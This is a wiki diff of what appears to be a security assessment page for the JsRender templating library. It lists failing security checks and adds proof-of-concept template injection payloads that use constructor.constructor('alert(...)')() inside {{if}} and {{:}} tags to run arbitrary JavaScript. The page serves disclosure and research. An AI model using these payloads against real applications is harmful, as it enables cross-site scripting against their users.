@@ -4,29 +4,32 @@
 
 = Introduction =
 
-"JsRender is a light-weight but powerful templating engine, highly extensible, and optimized for high-performance pure string-based rendering, without DOM or jQuery dependency.
+"!JsRender is a light-weight but powerful templating engine, highly extensible, and optimized for high-performance pure string-based rendering, without DOM or jQuery dependency.
 
-JSRender and JsViews together provide the next-generation implementation of both JQuery Templates, and JQuery Data Link - and supersede those libraries."
+JSRender and !JsViews together provide the next-generation implementation of both JQuery Templates, and JQuery Data Link - and supersede those libraries."
 
 From https://github.com/BorisMoore/jsrender
 
 = Quick Facts = 
 
- * [https://raw.github.com/BorisMoore/jsrender/master/jsrender.js JsRender 1.0.0-beta (Uncompressed)]
+ * [https://raw.github.com/BorisMoore/jsrender/master/jsrender.js !JsRender 1.0.0-beta (Uncompressed)]
 
- * *{}SEC-A* <font color="red">*FAIL*</font> Template expressions for conditions are equivalent to `eval`
+ * *{}SEC-A* <font color="red">*FAIL*</font> Template expressions for data paths/conditions are equivalent to `eval`
  * *{}SEC-B* <font color="red">*FAIL*</font> No sandbox or isolated execution scope
- * *{}SEC-C* <font color="green">*FAIL*</font> Any HTML element can server as template container
+ * *{}SEC-C* <font color="red">*FAIL*</font> Any HTML element can server as template container
  * *{}SEC-D* <font color="red">*FAIL*</font> No enforced separation, no obvious way to outsource templates to static files
  * *{}SEC-E* <font color="red">*FAIL*</font> No dedicated security response program, no security@jsviews.com address
 
 = Injection Attacks =
 
+!JsRender doesn't allow direct !JavaScript execution via template expressions - but as soon as conditions or data path queries are being used, the curse of the constructor strikes again. Almost nothing new here, moving on...
+
 {{{
 <script src="http://code.jquery.com/jquery.js" type="text/javascript"></script>
 <script src="https://rawgithub.com/BorisMoore/jsrender/master/jsrender.js" type="text/javascript"></script>
 <div id="tmpl" type="text/x-jsrender">
-    {{if constructor.constructor('alert(1)')()}}{{/if}}
+    {{if constructor.constructor('alert(1)')() /}}
+    {{:constructor.constructor('alert(2)')()}}
 </div>
 <script>
   $("#tmpl").render([{}])
